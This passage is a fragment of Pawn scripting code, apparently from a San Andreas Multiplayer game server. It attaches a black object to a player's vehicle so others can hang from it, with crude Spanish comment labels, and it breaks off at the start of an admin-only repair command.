    new object = CreateObject(19786, 0, 0, 0, 0, 0, 0, 80); // <puta>
    AttachObjectToVehicle(object, GetPlayerVehicleID(playerid), 0.000000, -3.799998, -0.499999, 90.000000, 0.000000, 0.000000); // <puta>
    SetObjectMaterial(object, 0, -1, "none", "none", 0x000000FF), SetObjectMaterial(object, 1, -1, "none", "none", 0x000000FF);
    ShowPlayerMessage(playerid, "Ahora pueden colgar de tu vehiculo.");
    return 1;
}
CMD:fix(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 0;

